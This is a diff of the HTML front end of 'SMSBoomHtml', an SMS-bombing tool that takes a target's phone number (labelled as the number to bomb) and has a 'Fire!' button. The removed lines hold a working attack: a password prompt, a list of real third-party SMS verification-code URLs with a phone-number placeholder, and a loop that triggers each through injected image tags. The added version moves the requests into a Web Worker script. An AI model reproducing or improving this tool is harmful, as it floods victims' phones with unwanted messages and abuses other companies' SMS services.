@@ -1,124 +1,62 @@
-<html style="">
-
+<!DOCTYPE html>
+<html lang="zh-cn" style="background: #26a69a">
 <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0" />
+    <title>短信测压</title>
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link href="css/materialize.css" type="text/css" rel="stylesheet" media="screen,projection" />
+    <link href="css/style.css" type="text/css" rel="stylesheet" media="screen,projection" />
+</head>
+<body>
+<a href="https://github.com/hirgen/SMSBoomHtml" class="github-corner" aria-label="在 GitHub 上查看源代码">
+		<svg width="150" height="150" viewBox="0 0 250 250" style="fill:white; color:#26a69a; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true">
+			<path d="M0,0 L115,115 L250,250 L250,0 Z"></path>
+			<path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+			<path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path>
+		</svg>
+	</a>
+    <style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+    <div class="section no-pad-bot" id="index-banner">
+        <div class="container">
+            <br>
+            <br>
+            <h1 class="header center white-text">SMSBoomHtml</h1>
+            <div class="row center">
+                <div class="input-field col s12">
+                    <input id="last_name" type="text" class="validate" style="color:white">
+                    <label for="last_name" style="color:white">要hz的手机号</label>
+                </div>
+            </div>
+            <div class="row center">
+                <a href="#!" class="btn waves-effect waves-teal" style="background-color:white;color:#26a69a;" onclick="fire()">Fire!</a>
+            </div>
+            <br>
+            <br>
+        </div>
+    </div>
+    <script src="https://code.jquery.com/jquery-2.1.1.min.js"></script>
+    <script src="js/materialize.js"></script>
+    <script src="js/init.js"></script>
     <style>
-        @media screen and (prefers-color-scheme: dark) {
-            button {
-                background: #333;
-            }
-            input {
-                color: #999;
-                background: #333;
-            }
-            html {
-                background: #202124;
-            }
-            button {
-                position: relative;
-                transition-duration: 0.4s;
-                text-decoration: none;
-                overflow: hidden;
-                cursor: pointer;
-            }
-            button:after {
-                content: "";
-                background: #555;
-                display: block;
-                position: absolute;
-                padding-top: 300%;
-                padding-left: 350%;
-                margin-left: -20px !important;
-                margin-top: -120%;
-                opacity: 0;
-                transition: all 1s
-            }
-            button:active:after {
-                padding: 0;
-                margin: 0;
-                opacity: 1;
-                transition: 0s
-            }
-            input[type=text]:focus {
-                box-shadow: inset 0px -1px #666, 0px 1px #666;
-                transition: 0.5s;
-            }
+        .btn,
+        .btn:hover {
+            -webkit-box-shadow: none;
+            box-shadow: none;
         }
-        @media screen and (prefers-color-scheme: light) {
-            button {
-                position: relative;
-                transition-duration: 0.4s;
-                text-decoration: none;
-                overflow: hidden;
-                cursor: pointer;
-            }
-            button:after {
-                content: "";
-                background: #cacaca;
-                display: block;
-                position: absolute;
-                padding-top: 300%;
-                padding-left: 350%;
-                margin-left: -20px !important;
-                margin-top: -120%;
-                opacity: 0;
-                transition: all 1s
-            }
-            button:active:after {
-                padding: 0;
-                margin: 0;
-                opacity: 1;
-                transition: 0s
-            }
-            input[type=text]:focus {
-                box-shadow: inset 0px -1px #cacaca, 0px 1px #cacaca;
-                transition: 0.5s;
-            }
-            input {
-                background: #efefef
-            }
-            html {
-                background: #ffffff;
-            }
+        input[type=text]:not(.browser-default),
+        input[type=text]:not(.browser-default):focus:not([readonly]),
+        input[type=text].valid:not(.browser-default) {
+            border-bottom: 1px solid white;
+            -webkit-box-shadow: 0 1px 0 0 white;
+            box-shadow: 0 1px 0 0 white;
         }
     </style>
-    <title>嘿嘿</title>
     <script>
-        var person = prompt("请输入暗号～", "");
-
-        function fire() {
-            var name = document.getElementById("uid").value;
+var worker = new Worker('js/api.js');
 
 
 
-            jiekou = ["https://gl.gdedu.gov.cn/api-service/captcha?phoneNumber={phone_number}&captchaType=QUERY_ADMIN", "http://id.lejiaolexue.com/api/sendvericode.ashx?phone={phone_number}", "http://api.welove520.com/v5/account/phone/verifyCode/send?phone_number={phone_number}&client_id=464847866_&type=6&area_code=86&app_key=ac5f34563a4344c4&sig=xvP64W04tR%2FNJoZEJEoJySmlIXU%3D", "https://uc.csdhe.com/v1/sms/send?mobile={phone_number}&apptype=examWeb", "https://elove.darryring.com/api/crm/newGwLogin/getSMSValidCode?phone={phone_number}&type=login", "https://mallapi.yofogo.com/biz-mall-application/v1/user/verifyCode/getVerifyCode?phone={phone_number}&descriptionType=1&codeType=2", "https://mall.yancais.com/api/sms/send?phone={phone_number}", "https://www.yojiang.cn/api/user/send_verify_code?phone={phone_number}", "http://jrh.financeun.com/Login/sendMessageCode3.html?mobile={phone_number}&mbid=197873&check=3", "https://www.phone580.com/fzsuserapi/user/sendsmscode?phonenum={phone_number}&modelid=16&templateid=42&key=&validCode=", "https://www.189.cn/dqmh/uamGetCheckCodeAction.do?method=getSMSDynamicCode&phoneNumber={phone_number}%20&ikl=1", "https://www.airparking.cn/h5app/sms/signup?mobile={phone_number}", "https://cloud.huace.cn/ChcnavCloudAuth/code/sms?mobile={phone_number}", "https://www.dehua.net/include/ajax.php?service=siteConfig&action=getphoneVerify&type=signup&phone={phone_number}&areaCode=86", "https://dss.xiaoyezi.com/student_app/auth/validate_code?mobile={phone_number}&country_code=86", "https://api.hetao101.com/login/v2/account/oauth/verifyCode?phoneNumber={phone_number}", "http://sms.shansuma.com/api/v1/user/getVerifyCode?action=register&hash_id=c9ba28333479fd27e02e9e12dfa7b37a&mobile={phone_number}", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", ""];
-            if (person == "NmSl") {
-                for (var i = 0; i < jiekou.length; i++) {
-                    jiekoua = jiekou[i].replace(/{phone_number}/, name)
-                    document.getElementById("d1").innerHTML = "<img src='" + jiekoua + "'>";
-                }
-            }
-
-        }
-    </script>
-</head>
-
-<body>
-    <br />
-    <br />
-    <br />
-    <br />
-    <br />
-    <br />
-    <h1 style="text-align: center;color:#666">给他来点厉害的</h1> 
-    <div style="margin-left: auto;margin-right: auto;width: 70%;">
-        <input id="uid" placeholder="需要XX的手机号" style="width: 100%;height: 30px;outline: none;border: none;" type="text" />
-    </div>
-    <div style="margin-left: auto;margin-right: auto;width: 100px;">
-        <button style="width: 100%;height: 30px;margin-top:30px;border: none;color: grey;" onclick="fire()">Fire!</button>
-    </div>
-
-    <div id="d1"></div>
-
+</script>
 </body>
-
 </html>
